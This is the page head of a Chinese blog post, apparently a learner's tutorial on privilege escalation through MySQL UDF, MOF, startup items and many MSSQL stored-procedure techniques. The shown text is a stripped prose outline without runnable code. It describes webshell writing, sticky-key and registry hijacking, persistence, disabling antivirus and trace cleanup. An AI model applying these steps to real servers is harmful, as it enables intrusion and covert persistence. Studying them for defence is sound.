<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>权限提升学习 | hybcx</title><meta name="keywords" content="Windows提权"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="权限提升学习"><meta name="application-name" content="权限提升学习"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="权限提升学习"><meta property="og:url" content="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 本文的来源主要是上一次刷vulnhub靶场所遗留的问题，本着哪里不懂学哪里的精神而撰写的本文，这次主要学习一下MySQL udf提权以及如何逃逸restricted shell（受限制的shell，也称lshell）。 最后会浅浅学习一下内网渗透时的一些常用工具的命令学习，废话不多说"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 前言 本文的来源主要是上一次刷vulnhub靶场所遗留的问题，本着哪里不懂学哪里的精神而撰写的本文，这次主要学习一下MySQL udf提权以及如何逃逸restricted shell（受限制的shell，也称lshell）。 最后会浅浅学习一下内网渗透时的一些常用工具的命令学习，废话不多说"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '权限提升学习',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 MySQL-udf 提权, 2.1 简介, 2.2 利用条件, 2.2.1 常规情况：, 2.2.2 特殊情况：, 查看当前数据库用户权限：, 2.3 版本特性, 1、 Mysql lt 4.1, 2、 Mysql lt 5.0, 3、 5.0 lt= Mysql lt 5.1, 4、 Mysql gt= 5.1, 2.4 UDF文件位置, 1、sqlmap：, 2、metaspliot：, 2.5 操作步骤, 1、查看可导出文件位置, 2、查看当前数据库用户权限, 3、确认mysql安装位置, 4、通过主机版本及架构确认mysql位数来选用udf文件, 5、查看数据库版本判断udf文件写入位置, 5.1 mysql大于5.1版本时, 5.1.2 sqlmap udf文件解码, 5.1.3 16进制编码udf文件, 5.1.4 udf写入plugin目录, 5.1.5 创建一个表并将二进制数据插入到十六进制编码流, 5.1.6 随便选择一个数据库后创建一个表, 5.1.7 insert插入第一段数据, 5.1.8 update拼接剩余数据, 5.1.9 导出表中数据到系统磁盘, 5.2 mysql小于5.1版本时：, 6、创建命令执行函数, 7、命令执行, 2.6 痕迹清除, 2.6.1 删除表, 2.6.2 删除函数, 2.7 其他问题, 1、ERROR 1125 (HY000), 2、提示sys_eval 函数已经存在但无法利用, 3、创建sys_eval 函数时提示已经存在但利用与删除时提示 sys_eval, 4、ERROR 1126 (HY000), 2.8 修复建议, 0x03 Linux-UDF提权, 0x04 MOF 提权, 简介, 原理, 提权过程, 清理痕迹, MSF MOF模块, 0x05 启动项提权, 启动项路径, MySQL写入启动项, MSF 启动项提权, 0x06 Mssql提权, 获取数据库密码, 常见存储过程, 存储过程写webshell, 差异备份写webshell, 日志备份写webshell, sp_addextendedproc, xp_cmdshell提权, 利用条件, 利用过程, 常见报错, 痕迹清理, sp_oacreate提权, 利用条件, 提权过程, xp_regwrite提权, Agent Job提权, CLR提权, 触发器提权, Mssql R 和 Python 提权, 沙盒提权, 方法一, 方法二, Mssql 模拟登录提权, 提权过程, 0x07 PowerUpSQL MSSQL 利用工具使用, 0x08 参考文章前言本文的来源主要是上一次刷靶场所遗留的问题本着哪里不懂学哪里的精神而撰写的本文这次主要学习一下提权以及如何逃逸受限制的也称最后会浅浅学习一下内网渗透时的一些常用工具的命令学习废话不多说直接开卷提权简介用户自定义函数通过添加新函数对的功能进行扩充调用方式与一般系统自带的函数相同例如等函数文件后缀在与系统下分别为与即动态链接库文件由编写利用条件将文件放到指定位置放在根目录的文件夹下从文件中引入自定义函数执行自定义函数用户权限问题获得一个数据库账号拥有对的和权限以为佳拥有将写入相应目录的权限数据库版本问题利用的其中一步是要将我们的文件上传到检索目录中各版本的检索目录有所不同版本路径导出路径随意需要导出至目标服务器的系统目录如必须导出到安装目录下的文件夹下一般文件夹需要手工建立可用流模式突破进而创建文件夹不过这种方法暂未见过常规情况配置文件项设置为空如果为或等指定目录即无法自定义文件导出位置则无法利用权限权限用户默认拥有所有权限首先基础语法查询是否没有限制说明不允许导入或导出只允许在目录导入导出空不限制目录在之前默认是空这个情况下可以向任意绝对路径写文件在之后默认是这个情况下不可以写文件特殊情况权限权限权限查看当前数据库用户权限我们进入所在的目录下打开输入账号密码登录数据库可以看到当前用户的权限情况代表有对应的权限版本特性提权操作中的一个步骤是将我们的文件上传到的检索目录中系统下各版本的检索目录有所不同在以前的版本中可以将所有的文件里面的任何函数都注册到里面以供调用无论这个在什么位置函数的声明是什么样的导出路径随意导出路径其他系统导出路径均为或安装目录的文件夹下如果安装时不选择完整安装或使用集成开发环境等情况下目录大概率是不存在的需要自行创建由于这里还得搭配环境我这里选择在虚拟机上下载小皮自带搭建成功文件位置操作步骤查看可导出文件位置这里看到我是很明显不能利用了因此我跟着网上文章改了一下配置为空方便接下来操作查看当前数据库用户权限可以看到有几个关键的权限确认安装位置通过主机版本及架构确认位数来选用文件此处显示为位操作系统查看数据库版本判断文件写入位置大于版本时查看目录存在目录且有时直接上传文件查看目录存在目录但没有时则需要以进制编码写入文件很明显我们这里的情况是后者文件解码首先将对应版本的文件进行进制编码中的文件为防止误杀默认是经过异或编码的需先使用自带的脚本解码进制编码文件写入目录将进制编码后文件使用函数写入磁盘导出文件会在末尾写入新行且转义换行符破坏二进制文件结构不会进行任何操作本以为可以顺利做下去了结果竟然没有目录这里也很疑惑明明查询到的服了这下得手动创建了没有那味儿了创建一个表并将二进制数据插入到十六进制编码流如果在低版本系统环境下或部分特殊环境使用命令提示符进行提权操作由于不同环境下的命令提示符可输入字符最大长度不同为系统为无法使用一次性写入全部进制字符则需要将文件的进制编码字符先进行切割再拼接写入到一个表中最后导出到目标系统注意在进行进制数据切割时每段字符的长度要为的倍数进制转为进制使用取四合一法如果位数不够会在最高位补补后会破坏原始二进制文件的文件结构导致利用失败这也是很多人此方法复现失败的原因随便选择一个数据库后创建一个表这里我是新建了一个数据库插入第一段数据当然这里如果你的数据长度恰好的话直接插入也是可以的拼接剩余数据导出表中数据到系统磁盘做到这里突然蒙蔽了跟着文章做的但是这里似乎又重复上传了一下不理解是干嘛的我认为在步骤之后应该是没有办法直接将文件传到目录下的时候所应该有的而该作者在之前就已经靠语句写入到了目录下到这儿应该就是成功了吧我不理解他的布局了估计是混乱了查看目录不存在目录但有可使用创建目录查看目录不存在目录也没有此时就要使用网传文件流创建目录的方法了上次听到这个名词还是在做靶场的时候文件流是文件系统为了能与系统下的文件系统兼容而设计出的经实践在命令提示符下使用文件流是可以成功创建目录或者文件名的但在独立安装的数据库环境与自带环境下均创建失败并且查阅网上各种文章也都是没有利用成功的严重怀疑是哪位小可爱臆想出来的但为了文章完整性还是决定写出来可见没有几乎不可能了如上图下提示创建目录成功数据库下报错小于版本时有时通过上传文件无时使用通过进制数据流写入文件创建命令执行函数使用打开文件在最下方可以看到文件提供的函数执行任意系统命令并将输出返回执行任意系统命令并将退出码返回无命令执行结果回显命令执行可以将上述步骤简单总结一下注意先指定数据库新建一个表名为用于存放本地传来的文件的内容文件的进制格式在中写入文件内容的内容将文件内容传入新建的文件中路径根据自己的修改对于小于的导出目录为或痕迹清除删除表删除函数其他问题提示函数已经存在可能已经被利用过了尝试直接调用函数这里借用别人的图解了提示函数已经存在但无法利用尝试将提权相关的利用函数进行删除后重新创建创建函数时提示已经存在但利用与删除时提示函数不存在实战无法解决漏洞复现可以原因是上一个人利用过后数据库进行了重启之后重启服务器再创建就可以了在进行提权时碰到这个错误一般是文件位数选择错误尝试另一个位数的文件修复建议配置文件中项设置为或非目录数据库用户确保正确实施最小权限原则提权环境下的提权大概率仅限于靶场环境中原因在严格的系统权限下用户或用户无目录的写入权限环境下的提权除利用条件外与环境下完全相同利用条件除篇中的内容外还需要目录的写入权限因此这里我也找文章复现了只能说遇到的话在研究吧下次学习一番逃逸但似乎这类文章不好找提权简介权限方法提权是来自国外大牛发布的简称远程提权管理规范提供了以下三种方法编译到存储库的托管对象格式文件方法运行文件指定为命令行参数将文件方法使用接口和方法方法拖放到文件夹的文件建议您到存储库编译文件使用前两种方法也就是运行文件或使用方法第三种方法仅为向后兼容性与早期版本的提供并因为此功能可能不会提供在将来的版本后不应使用注意使用方法提权的前提是当前帐号可以复制文件到目录下否则会失败也就是说提权其实是的问题而不是的漏洞第三种方法仅为向后兼容性与早期版本的提供因为此功能可能不会提供在将来的版本后开始默认使用选项不能随意选择导出路径所以提权仅适用于以下条件操作系统版本低于版本低于原理目录下的文件每隔一段时间几秒钟左右都会被系统执行因为这个里面有一部分是脚本所以可以利用这个脚本来调用来执行系统命令如果有权限操作目录的话就可以来执行任意命令了提权过程查看版本编写并上传文件脚本的内容如下核心为写文件的特性将这个文件导入到目录下依然采用上述编码的方式先上传到可写目录然后导出到指定目录执行成功的的时候会出现在目录下否则出现在目录下清理痕迹因为每隔几分钟时间又会重新执行添加用户的命令所以想要清理痕迹得先暂时关闭服务再删除相关文件这个时候再删除用户才会有效果停止服务删除文件夹手动删除文件删除创建的用户重新启动服务模块里面也自带了提权模块使用起来也比较方便而且也做到了自动清理痕迹的效果实际操作起来效率也还不错设置好自己的设置目标的基础信息实际运行效果如下贴图启动项提权这种提权也常见于环境下当的启动项可以被写入的时候可以使用将自定义脚本导入到启动项中这个脚本会在用户登录开机关机的时候自动运行但开始默认使用选项不能随意选择导出路径所以这种办法需要目标版本低于启动项路径的启动项路径中文系统开始菜单程序启动开始菜单程序启动英文系统开关机项需要自己建立对应文件夹的启动项路径既然知道路径的话就往启动项路径里面写入脚本吧脚本支持和类型可以利用执行一些命令也可以使用上线或者这方面还是比较灵活的下面是一个执行基础命令的脚本写入启动项将上述或者的马转十六进制直接写如到系统启动项中写入成功的时候就等待系统用户重新登录登录成功的话我们的自定义脚本也就会被执行启动项提权配置连接信息启动项文件夹得自己根据实际的目标系统来进行调整会写入木马到启动项中执行完成后开启监听会话当目标系统重新登录的时候这里可以看到已经成功上线了提权作为在系统下最常用的数据库利用来提权也是经常会遇到的下面就针对如何提权做一个详细的介绍获取数据库密码翻配置文件站点站点暴力破解常见存储过程首先先看几个常见的存储过程用于显示当前目录的子目录该存储过程有三个参数第一个参数是要查询的目录第二个参数是要显示的子目录的深度默认值是表示显示所有的子目录第三个参数是类型指定是否显示子目录中的文件默认值是表示不显示任何文件只显示子目录只列文件夹列文件夹加文件列出所有文件和目录子目录内容会很多慎用还可以用来触发请求用于得到给定的文件夹内的文件夹列表列出目录用于查看磁盘驱动器剩余的空间查看磁盘驱动的空闲空间用于获得当前所有驱动器列出磁盘用于判断文件是否存在的存储过程参数是文件的路径或目录的路径判断文件是否存在用于创建子目录的存储过程参数是子目录的路径创建子目录用于删除文件的存储过程但该存储过程不会删除任意类型的文件系统限制它只能删除特定类型备份文件和报表文件的文件删除文件第一个参数是文件类型有效值是和是指备份文件是指报表文件第二个参数是目录路径目录中的文件会被删除目录路径必须以结尾第三个参数是文件的扩展名常用的扩展名是或第四个参数是早于该日期创建的文件将会被删除第五个参数是子目录类型是指忽略子目录是指将会删除子目录中的文件可以查看指定的注册表枚举可用的注册表键值可以删除指定的注册表值删除指定的注册表值存储过程写利用条件拥有权限知道的网站绝对路径首先判断当前是否为权限为则可以提权利用存储过程写入一句话注意路径差异备份写在里和权限都有备份数据库权限我们可以把数据库备份成文件获得利用条件需要知道绝对路径路径可写生成备份文件注意库名和路径创建表插入一句话再次备份注意路径因为权限的问题最好不要备份到盘符根目录如果这种方式失败大概率是备份的目录没有写权限当过滤了特殊的字符比如单引号或者路径符号都可以使用定义局部变量来执行日志备份写优势重复性好多次备份的成功率高相对于差异备份而言的体积较小利用条件拥有权限知道网站绝对路径并且可写站库不分离数据库必须被备份过一次判断当前是否为权限为则可以提权利用存储过程写入一句话注意库名和路径库名库名库名可以利用于恢复组件提权是中的一个组件我们可以用它来执行系统命令利用条件拥有权限在中的权限是中是依赖利用过程判断当前是否为权限为则可以提权查看是否存在查看能否使用从版本之后默认关闭关闭开启执行调用用远程下载并执行无会显也无法进行怎么办通过临时表查看命令执行的结果常见报错标记配置选项不存在也可能是高级选痕迹清理删除扩展存储过过程如果被删除了怎么办如果被删除了需要重新恢复或自己上传进行恢复以为例默认路径为判断存储扩展是否存在返回结果为就恢复返回结果为就否则上传提权是一个非常危险的存储过程可以删除复制移动文件还能配合来写文件执行利用条件拥有权限依赖提权过程判断当前是否为权限为则可以提权判断状态如果存在返回启用组件执行命令利用组件执行命令利用组件写文件对象利用对象允许我们复制文件管理驱动器等等利用写脚本配合组件执行复制具有不同名称和位置的可执行文件移动文件删除文件替换粘滞键对象利用未测试成功允许我们在中实际运行脚本语言例如或使用创建帐户更改其密码并将新帐户添加到管理员组下载恶意软件对象利用写入启动项提权利用条件修改注册表来劫持粘贴键映像劫持利用函数修改注册表起到劫持作用检查是否劫持成功将对象注册到在进行利用的时候就有使用组件执行命令的方法使用其注册当命令处理器启动时如果未指定标志将执行命令将的注册表项与软件可执行路径添加作为持久化的后门和注册表项会导致程序在用户每次登录时运行通过将带有可执行路径的条目添加到此注册表路径攻击者确保每次用户登录服务器时都会执行恶意软件注销重新登录触发禁用指定软件攻击者需要确保在部署加密矿工时杀死反病毒进程以保持不被发现所以可以设置在某些应用启动时自动关闭禁用正在运行的进程的方法是使用通过添加值为的调试器键在这种情况下将杀死特定进程此时只要开启就会自动关闭提权代理是一项服务它执行计划的管理任务这些任务在中称为作业利用条件拥有权限需要代理开启版本是无法启用的开启服务利用任务计划命令执行无回显可以创建任务这里为任务名称并执行命令命令执行后的结果将返回给文本文档提权从开始集成了用于的的公共语言运行时组件这意味着现在可以使用任何语言包括和来编写存储过程触发器用户定义类型用户定义函数用户定义聚合和流式表值函数方式可以利用进制文件流方式导入文件不需要文件落地中的进制的的制作可以参考下面的文章利用条件拥有权限启用版本之前显示高级选项启用将存储程序集的数据库配置为可信赖的启用版本及之后引入了严格的安全性可以选择根据提供的散列专门授予单个程序集的权限将某程序集的哈希值添加到可信程序集列表中配置权限是我指定的数据库导入插件创建函数利用执行系统命令格式简化导入插件进制的创建函数利用执行系统命令触发器提权触发器是一种特殊类型的存储过程它不同于存储过程触发器主要是通过事件进行触发被自动调用执行的而存储过程可以通过存储过程的名称被调用包括三种常规类型的触发器触发器触发器和登录触发器登录触发器登录触发器将为响应事件而激发存储过程与实例建立用户会话时将引发此事件登录触发器将在登录的身份验证阶段完成之后且用户会话实际建立之前激发因此来自触发器内部且通常将到达用户的所有消息例如错误消息和来自语句的消息会传送到错误日志如果身份验证失败将不激发登录触发器设置一个触发器当表更新时触发命令表更新时自动触发实际测试可以看到执行命令卡住了一直没有结束查看任务管理器运行了手动将结束此时语句执行完毕返回结果执行时间等于运行的时间和提权在及更高版本中与一起随附在机器学习服务中该服务允许通过中执行和脚本利用条件必须要在安装过程中选择必须启用外部脚本重新启动数据库服务器用户拥有执行任何外部脚本权限脚本利用利用执行命令利用抓取哈希脚本利用查看版本利用执行命令利用读文件沙盒提权分布式查询允许从多个异构数据源例如的多个实例访问数据这些数据源可以存储在相同或不同的计算机上启用临时访问后登录到该实例的任何用户都可以使用提供程序通过或函数执行引用网络上任何数据源的语句攻击者滥用分布式查询和来创建和执行旨在从远程服务器下载恶意可执行文件的脚本利用条件拥有权限服务权限为服务器拥有驱动方法一修改注册表关闭沙盒模式开启系统目录下默认自带了个数据库文件所以直接调用即可默认无数据库文件需要自己上传或者用路径加载文件方能执行命令默认未注册接口所以无法利用沙盒模式执行系统命令方法二使用场景无法执行命令时可用使用条件开启沙盒模式参数含义默认是在任何所有者中禁止启用安全模式为仅在允许范围内必须在模式下完全开启利用执行系统命令添加用户将用户添加至管理员组模拟登录提权开发者有时为了满足某种需求允许其他登录用户模拟高权限的用户对于开发来说一个再简单不过的功能虽然严格意义上这不算个漏洞但是这种配置不当一般可以用来提权提权过程赋予用户权限来模拟及查找可以模拟登录的用户默认情况下系统管理员可以模拟任何人但是正常登录必须分配权限来模拟特定的用户使用用户登录打开新建查询执行下面语句查询那些用户可以用来模拟登录这里我们可以看到用户可以模拟登录用户接下来就是模拟登录来获取权限了模拟用户登陆验证是否为权限模拟登录验证是否为权限当然这个也可以用一键实现脚本地址利用工具使用参考文章从开始学习数据库攻防参考文章数据库提权系列提权篇提权提权可以看这篇漏洞利用与提权提权总结注入与提权方法整理',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-08-06 22:19:53',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" 